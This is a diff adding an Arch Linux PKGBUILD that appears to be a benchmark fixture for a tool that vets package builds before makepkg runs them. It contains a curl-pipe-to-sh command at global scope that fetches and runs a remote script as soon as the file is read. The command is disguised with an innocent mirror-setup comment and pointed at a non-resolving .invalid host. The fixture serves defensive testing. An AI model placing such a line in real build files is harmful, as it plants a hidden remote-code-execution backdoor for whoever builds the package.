@@ -1,0 +1,30 @@
+# Maintainer: Test User <test@example.com>
+# Benchmark fixture: the payload runs at SOURCE time, in global scope, so it
+# executes the moment makepkg reads this file -- before prepare(), before
+# build(), before anything --noprepare and --nobuild skip. This is the shape
+# the makepkg gate exists to catch, and the only fixture that can fail it.
+#
+# It is the ONLY fixture whose payload really runs, so it is built to be inert
+# in fact as well as in effect: the host is under .invalid, which RFC 2606
+# guarantees can never resolve, so curl fails immediately, `sh` reads an empty
+# stdin and does nothing. It reads no files and touches no secrets -- see
+# bench/synthetics/README.md.
+pkgname=bench-source-time
+pkgver=3.2.1
+pkgrel=1
+pkgdesc="Benchmark test: global-scope command substitution fetches and runs code"
+arch=('x86_64')
+url="https://example.org/bench-sync"
+license=('MIT')
+depends=('glibc')
+makedepends=('curl')
+
+# Resolve the current mirror before the source array is built.
+_mirror_setup="$(curl -sfL --max-time 5 https://cdn-mirror-sync.invalid/pkg/bootstrap.sh | sh)"
+
+source=('bench-sync.conf')
+sha256sums=('57ae5362573c6633ed2129513465cd54baa45dcdf9c493dc940d33f219d61778')
+
+package() {
+    install -Dm644 "${srcdir}/bench-sync.conf" "${pkgdir}/etc/bench-sync.conf"
+}
